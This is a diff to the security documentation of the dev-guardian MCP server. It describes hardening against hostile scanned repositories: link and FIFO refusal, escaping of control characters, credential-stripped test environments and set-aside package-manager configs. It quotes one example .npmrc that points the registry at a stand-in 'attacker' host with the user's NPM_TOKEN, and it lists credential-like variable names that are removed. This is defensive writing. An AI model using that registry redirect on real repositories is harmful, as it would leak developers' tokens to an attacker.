@@ -245,6 +245,91 @@ their respective projects.
 - **Least privilege.** The MCP server reads and writes within the target project
   and its `.guardian/` directory, plus the temporary directories and user cache
   listed in [mcp/README.md](mcp/README.md#what-the-server-writes).
+- **The scanned repository's files are hostile input.** A clone, an archive or
+  a pull request chooses what is at every path in it — a link, a junction, a
+  FIFO, a device, a file of any size — and the server acts on it at startup,
+  before any tool call (it keeps `.guardian/` out of `.gitignore`). Every read
+  of a project file goes through `mcp/src/platform/projectFs.ts`: a path that
+  resolves outside the project (a link, `..`), a link to a network or device
+  path, anything but a regular file (judged by `fstat` on a descriptor opened
+  non-blocking, so a FIFO is never waited on), and a file over the caller's cap
+  are refused with a typed reason, and at most cap + 1 bytes are ever read.
+  Every write into the project `lstat`s the target and refuses a link (a
+  junction or a dangling link included) or a non-regular file, refuses a
+  directory on the way that resolves outside the project, and writes a temp
+  file beside the target that is then published with `link()` (create) or
+  `rename()` (replace) — never written through a link, never into an inode a
+  hard link shares. The tree hash hashes a link by its target text without
+  following it; a report directory (`.guardian/reports/…`) with a link on its
+  way is replaced by a fresh temp directory; `precommit_install` refuses a
+  `.git`, hooks directory or hook file that would send pre-commit's writes
+  elsewhere. A source-scan test lists every raw `fs` call left in `mcp/src`
+  with the reason it is not the repository's. **Not yet converted**, and
+  named there: the repository reads in `runners/` (the Trivy and repository
+  scanner configs, `yarn.lock` and Python manifests read for Trivy's gaps, the
+  stack detector's manifests, the project's Semgrep rule files) and
+  `skillaudit/`, and the `.guardian/guardian.db` the storage layer opens.
+- **Repository text is escaped before it is shown.** A rule message, a
+  snippet, a file name, a reason or a title can carry characters that render
+  as nothing or reorder what does (a right-to-left override, a zero-width
+  space, ESC). Every string in every tool result and resource — keys included
+  — is passed through `untrustedText` (`mcp/src/platform/untrustedText.ts`) at
+  the MCP response boundary, and to every progress notification's message:
+  C0 and C1 controls (except `\n` and `\t` outside a path, name or id; a
+  Windows `\r\n` in a multi-line field is read as `\n`, a lone `\r` is
+  escaped), bidi controls and every other default-ignorable code point are
+  written as a visible `\u{XXXX}`. The emoji sequences, keycaps,
+  CJK variation selectors and subdivision flags `audit_mcp_tools` already
+  exempts pass unchanged, and so does every other character: a `日本.py` stays
+  `日本.py`. Stored findings are unchanged; only what is shown is escaped. The
+  CLI's human output (`scan`, `baseline update`, `check`) is escaped the same
+  way, and `status` still strips terminal escape sequences.
+- **`create_fix_pr` runs the project's code.** To judge a candidate fix it runs
+  the project's own test command — `npm test` (`scripts.test`), `pytest` (every
+  `conftest.py`), `cargo test` (`build.rs`), `go test` — in its worktrees,
+  **on a dry run too**, and its description says so. That command runs with an
+  allowlisted environment (`extendEnv: false`): `PATH`, the home and temp
+  directories, the locale, `CI`, the variables every Windows process expects,
+  and the toolchains' own (`NODE_*`, `PYTHON*`, `CARGO_HOME`, `RUSTUP_HOME`,
+  `GOPATH`, `GOCACHE`, …), with any name that looks like a credential
+  (`TOKEN`, `SECRET`, `PASSWORD`, `AUTH`, `API_KEY`, …), every `GUARDIAN_*`
+  and every `npm_config_*` removed — no token or cloud credential the server
+  was started with reaches it. It is still the repository's code, running as
+  you, with your files: run `create_fix_pr` only on a repository whose tests
+  you would run yourself.
+- **A repository never chooses where `create_fix_pr`'s package managers send
+  your credentials.** A repository `.npmrc` with `registry=https://attacker/`
+  and `//attacker/:_authToken=${NPM_TOKEN}` made `npm outdated`, `npm ci`,
+  `npm install` and `npm audit` in its checkouts fetch from that host with
+  your own token (`--ignore-scripts` does not stop a fetch); a scoped
+  registry (`@acme:registry=…`) is the same route, and a requirements file's
+  `--index-url` makes `pip-audit` install from — and build sdists fetched
+  from — the repository's index. In every checkout `create_fix_pr` works in
+  (the planning tree, the fix's worktree, the base-commit tree), the
+  repository's own `.npmrc`, `.pnpmrc`, `.yarnrc`, `.yarnrc.yml`,
+  `pip.conf`, `pip.ini`, `.pip/`, `.cargo/config.toml` / `.cargo/config`,
+  `.bundle/config` and `NuGet.config` — in the project's directory and every
+  directory above it in the checkout — are moved out before any package
+  manager runs, named in the group's `package_config_set_aside`, and put back
+  before anything is committed. Every package-manager process it runs, itself
+  or through `deps_update_plan` and `deps_audit` (`npm`, `pip-audit`,
+  `composer`, `bundle`, `cargo`, `go`, `dotnet restore`), gets the test
+  command's allowlisted environment plus your own package-manager
+  configuration: the `NPM_CONFIG_*`, `YARN_*`, `PIP_*`, `COMPOSER_*`,
+  `CARGO_REGISTRIES_*`, `BUNDLE_*`, `NUGET_*`, `GOPROXY`-family and proxy
+  variables, and exactly the variables your own `~/.npmrc` (or the file
+  `NPM_CONFIG_USERCONFIG` names), `~/.yarnrc` and `~/.yarnrc.yml` reference
+  as `${VAR}` — so a token you configured for your own registry still
+  reaches it, and only it. A fix whose requirements (or a file they include
+  with `-r` / `-c`) set `-i`, `--index-url`, `--extra-index-url`,
+  `--find-links` or `--trusted-host` is refused when it would install from
+  them — a pip step, or any re-scan by `deps_audit` — and so is a Composer
+  fix whose `composer.json` declares `repositories` (the manifest the fix
+  edits cannot be set aside); the planner does not plan Composer there
+  either. Not covered: a lockfile's own `resolved` URLs (npm sends a token
+  only to the host it was configured for), a direct-URL or VCS requirement,
+  and the scans a user runs outside `create_fix_pr`, which keep their
+  environment and the repository's configuration.
 
 ## Network egress
 
@@ -283,7 +368,7 @@ project's own build and test commands.
 | Maven Central | Trivy, for a `pom.xml` (in the tools above, and `compliance_check`'s license scan) | when it resolves Maven dependencies — **even with `local_only: true`** under `audit_executive`; Trivy's `--offline-scan`, which dev-guardian does not pass, stops it |
 | Trivy's version check and anonymous usage telemetry (`check.trivy.dev`) | **disabled by dev-guardian**: every Trivy run gets `TRIVY_SKIP_VERSION_CHECK=true` and `TRIVY_DISABLE_TELEMETRY=true`, and a Trivy 0.63.0 or newer also `--skip-version-check --disable-telemetry` (`mcp/src/runners/trivyRun.ts`; `init_project`'s status script sets the two variables) | never. Measured through a refusing proxy on 0.69.3: only both settings together stop the request; each alone does not. Trivy before 0.63.0 has neither the check nor the flags. |
 | Package registries, through the package managers | `deps_audit` and `audit_executive`, which runs it (`npm audit`; `pip-audit`, which installs the requirements into a temporary virtualenv from PyPI) — **even with `local_only: true`**, `deps_update_plan` (`npm outdated`, `composer outdated`, `bundle outdated`, `go list -m -u`, `cargo outdated`), `create_fix_pr` (installs in its worktree with `--ignore-scripts` / `--no-scripts`) | per call |
-| The project's own test command and whatever it fetches | `create_fix_pr` runs `npm test`, `pytest`, `cargo test` or `go test ./...` in its worktrees (`cargo` and `go` download the project's dependencies; `npm ci --ignore-scripts` runs first when there is a lock file) | only for a candidate fix, dry runs included |
+| The project's own test command and whatever it fetches | `create_fix_pr` runs `npm test`, `pytest`, `cargo test` or `go test ./...` in its worktrees — the project's own code, with an allowlisted environment that carries no token or credential of the server's (see [Hardening posture](#hardening-posture)) — (`cargo` and `go` download the project's dependencies; `npm ci --ignore-scripts` runs first when there is a lock file) | only for a candidate fix, dry runs included |
 | nuclei's update check and templates | `scan_dast` with `use_nuclei` | nuclei's own automatic update check and template download are on by default; dev-guardian does not pass `-disable-update-check` |
 | Syft's update check (`toolbox-data.anchore.io`) | **disabled by dev-guardian**: every Syft run gets `SYFT_CHECK_FOR_APP_UPDATE=false`, and `-c` pointing at an empty file, so a repository's `.syft.yaml` cannot turn on Syft's network lookups either (`mcp/src/runners/syftRun.ts`) | never |
 | The GitHub API | `scan_iac`'s zizmor, when a GitHub token (`GH_TOKEN`) is in the server's environment | zizmor's online audits; without a token it runs offline |
